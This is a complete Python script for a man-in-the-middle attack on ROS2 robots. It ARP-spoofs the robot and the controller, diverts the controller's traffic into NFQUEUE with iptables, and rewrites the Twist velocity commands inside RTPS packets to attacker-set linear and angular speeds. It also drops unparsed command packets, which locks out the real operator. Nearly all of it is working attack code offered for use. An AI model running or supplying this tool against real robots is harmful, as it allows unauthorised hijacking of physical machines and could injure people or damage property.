import argparse
import os
import signal
from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import struct
import sys

# Shared control variables
target_linear  = 0.0
target_angular = 0.0

# --- MAC RESOLUTION & ARP SPOOFING ---
def get_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip:
                    return fields[3]
    except:
        pass
    return None

def spoof(target_ip, host_ip, target_mac, interface):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=host_ip
    )
    sendp(packet, iface=interface, verbose=False)

def arp_poison_thread(robot_ip, controller_ip, robot_mac, controller_mac, interface):
    print("[*] ARP poison active (20Hz)")
    while True:
        spoof(robot_ip, controller_ip, robot_mac, interface)
        spoof(controller_ip, robot_ip, controller_mac, interface)
        time.sleep(0.01)

# --- DYNAMIC TWIST DETECTION ---
def find_twist_offsets(payload):
    """
    Scan payload for 6 consecutive doubles that match a Twist message.
    Returns (lin_x_offset, ang_z_offset) or (None, None)
    """
    for i in range(len(payload) - 48):  # 6 doubles = 48 bytes
        try:
            vals = struct.unpack('<6d', payload[i:i+48])
            # Heuristic: values must be reasonable velocities
            if all(-10.0 < v < 10.0 for v in vals):
                lin_x = vals[0]
                ang_z = vals[5]
                # At least one should be non-zero sometimes
                if abs(lin_x) > 0.001 or abs(ang_z) > 0.001:
                    return i, i + 40  # angular.z is +40 bytes
        except:
            continue
    return None, None

# --- PACKET PROCESSING ---
def process_packet(packet):
    global target_linear, target_angular
    try:
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
            raw_data = scapy_pkt[Raw].load
            # RTPS DATA marker
            marker = b'\x15\x05'
            if marker in raw_data:
                lin_x_off, ang_z_off = find_twist_offsets(raw_data)
                # ? CASE 1: We found Twist ? INJECT
                if lin_x_off is not None:
                    new_payload = (
                        raw_data[:lin_x_off] +
                        struct.pack('<d', float(target_linear)) +
                        raw_data[lin_x_off+8:ang_z_off] +
                        struct.pack('<d', float(target_angular)) +
                        raw_data[ang_z_off+8:]
                    )
                    scapy_pkt[Raw].load = new_payload
                    # Fix checksums
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[UDP].len
                    del scapy_pkt[UDP].chksum
                    
                    packet.set_payload(bytes(scapy_pkt))
                    
                    if target_linear != 0 or target_angular != 0:
                        print(f"[*] OVERRIDE: L:{target_linear:.2f} A:{target_angular:.2f}")
                        
                    packet.accept()
                    return
                # ? CASE 2: RTPS DATA but NOT parsed ? DROP
                else:
                    print("[DROP] Unknown RTPS DATA packet (blocking controller)")
                    packet.drop()
                    return
    except Exception as e:
        print(f"\n[ERROR] {e}")
    # Default: allow everything else
    packet.accept()

# --- MAIN ---
if __name__ == "__main__":
    # Add these three lines to catch the GUI's stop command!
    def sigterm_handler(signum, frame):
        raise KeyboardInterrupt
    signal.signal(signal.SIGTERM, sigterm_handler)

    parser = argparse.ArgumentParser(description="ROS2 Dynamic RTPS MitM")
    # ... (rest of the argparse setup)
    parser = argparse.ArgumentParser(description="ROS2 Dynamic RTPS MitM")
    parser.add_argument("--robot", required=True, help="Robot IP")
    parser.add_argument("--controller", required=True, help="Controller IP")
    parser.add_argument("--iface", default="wlan0", help="Network Interface")
    parser.add_argument("--queue", type=int, default=1, help="NFQueue Number")
    parser.add_argument("--linear", type=float, default=0.0, help="Override Linear Velocity")
    parser.add_argument("--angular", type=float, default=0.0, help="Override Angular Velocity")
    args = parser.parse_args()

    robot_ip = args.robot
    controller_ip = args.controller
    interface = args.iface
    queue_number = args.queue
    target_linear = args.linear
    target_angular = args.angular

    r_mac = get_mac(robot_ip)
    c_mac = get_mac(controller_ip)

    if r_mac and c_mac:
        print("[*] Enabling IP Forwarding...")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1")

        print(f"[*] Setting up targeted iptables rules for NFQUEUE #{queue_number}...")
        # Target specific traffic: Controller -> Robot
        os.system(f"sudo iptables -I FORWARD -s {controller_ip} -d {robot_ip} -j NFQUEUE --queue-num {queue_number}")
        
        # Optional: Uncomment if you also need to modify Robot -> Controller telemetry
        # os.system(f"sudo iptables -I FORWARD -s {robot_ip} -d {controller_ip} -j NFQUEUE --queue-num {queue_number}")

        threading.Thread(
            target=arp_poison_thread,
            args=(robot_ip, controller_ip, r_mac, c_mac, interface),
            daemon=True
        ).start()

        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_number, process_packet)

        print(f"[*] MITM HIJACK STARTED: {controller_ip} -> {robot_ip}")
        print(f"[*] Injecting: Linear={target_linear}m/s, Angular={target_angular}rad/s")

        try:
            nfqueue.run()
        except KeyboardInterrupt:
            pass
        finally:
            print("\n[*] Shutting down and cleaning up...")
            nfqueue.unbind()
            # Clean up the specific iptables rule
            os.system(f"sudo iptables -D FORWARD -s {controller_ip} -d {robot_ip} -j NFQUEUE --queue-num {queue_number}")
            # Disable IP forwarding (optional, but good practice for cleanup)
            os.system("sudo sysctl -w net.ipv4.ip_forward=0")
            print("[*] Cleanup complete.")
    else:
        print("[!] Failed to resolve MAC addresses")